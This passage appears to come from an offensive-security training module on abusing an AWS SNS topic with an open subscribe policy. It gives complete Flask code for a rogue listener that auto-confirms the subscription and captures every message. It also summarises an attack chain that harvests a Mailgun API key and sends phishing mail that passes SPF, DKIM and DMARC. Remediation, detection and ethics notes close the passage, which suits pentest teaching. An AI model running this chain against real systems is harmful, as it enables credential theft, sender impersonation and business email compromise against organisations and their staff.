Objective: Register a rogue HTTPS endpoint as an SNS subscriber, complete the mandatory SNS subscription confirmation flow, and verify that all future messages published to the target topic are delivered to your listener.
Prerequisites:
  • Completion of M07-L01 — you must have identified an SNS topic with Principal: * on SNS:Subscribe and its full topic ARN

  • Internet-accessible listener machine — SNS must be able to reach your endpoint over HTTPS on a public IP or ngrok tunnel; SNS source IPs are in the range documented at ip-ranges.amazonaws.com

The HTTPS tunnel is required — SNS validates the endpoint certificate and will not deliver to plain HTTP endpoints by default (HTTP is only allowed for test/dev topics where DeliveryPolicy explicitly permits it). Note the forwarding URL — you will use it as the notification endpoint when subscribing.

2
Create a Flask listener that captures all incoming POST data and handles the SNS subscription confirmation flow automatically. SNS sends two types of messages: SubscriptionConfirmation (sent once when you subscribe — you must visit the embedded SubscribeURL to confirm) and Notification (the actual message payloads). Without confirming, the subscription stays in PendingConfirmation state and no messages are delivered.
Terminal
$ cat > capture_server.py <<'PYEOF' from flask import Flask, request import json, datetime app = Flask(__name__) @app.route('/capture', methods=['POST', 'GET']) def capture(): timestamp = datetime.datetime.now().isoformat() data = request.get_json(force=True, silent=True) or request.data.decode() print(f"\n{'='*60}") print(f"[{timestamp}] Received {request.method} from {request.remote_addr}") print(f"Headers: {dict(request.headers)}") print(f"Body: {json.dumps(data, indent=2) if isinstance(data, dict) else data}") print(f"{'='*60}\n") # Auto-handle subscription confirmation if isinstance(data, dict) and data.get('Type') == 'SubscriptionConfirmation': import urllib.request subscribe_url = data.get('SubscribeURL') print(f"[!] Auto-confirming subscription: {subscribe_url}") urllib.request.urlopen(subscribe_url) print("[+] Subscription confirmed -- messages will now be delivered") # Save captured messages with open('captured_messages.json', 'a') as f: f.write(json.dumps({'timestamp': timestamp, 'data': data}) + '\n') return 'OK', 200 if __name__ == '__main__': app.run(host='0.0.0.0', port=5000, debug=True) PYEOF
$ python3 capture_server.py &
* Running on all addresses (0.0.0.0) * Running on http://127.0.0.1:5000 * Running on http://10.0.1.50:5000 * Debugger is active!

ATTACK CHAIN SUMMARY — M07 SNS Credential Harvesting ===================================================== Step 1: SNS topic "email-dispatch" has Principal:* on SNS:Subscribe policy Step 2: Registered rogue HTTPS endpoint via sns:Subscribe Step 3: Confirmed subscription via SubscribeURL Step 4: All SNS messages now delivered to attacker endpoint Step 5: Mailgun API key extracted from message payload via jq Step 6: Key validated against Mailgun v3 API -- domain "targetcorp.com" active Step 7: Test phishing email sent from security@targetcorp.com Step 8: Email delivered to lab inbox, SPF/DKIM/DMARC all PASS BUSINESS IMPACT: - Attacker can send unlimited email as any @targetcorp.com address - Emails pass all authentication checks (SPF, DKIM, DMARC) - Indistinguishable from legitimate corporate communications - Enables targeted spear-phishing of employees, customers, partners - Enables business email compromise (BEC) scenarios REMEDIATION RECOMMENDATIONS: - Remove Principal:* from SNS topic subscribe policies - Rotate the exposed Mailgun API key immediately - Move API credentials to AWS Secrets Manager; inject via IAM role, not message payloads - Enable SNS subscription confirmation monitoring in CloudTrail

Scope and Ethics Note: Phishing through the target's own email infrastructure requires explicit written authorization in the Rules of Engagement. This technique is high-impact because SPF, DKIM, and DMARC all pass, making the email indistinguishable from legitimate corporate communications. Never send phishing emails to real recipients outside the defined scope. Always rotate or revoke harvested keys immediately after demonstrating access.

Detection Note: Mailgun logs all API calls with timestamps and source IPs. Unusual sending patterns (new source IPs, unexpected recipients, or volume spikes) are detectable in Mailgun's own audit logs and in the target's email gateway logs. MITRE ATT&CK: T1566.002 — Phishing: Spearphishing Link + T1586.002 — Compromise Accounts: Email Accounts.
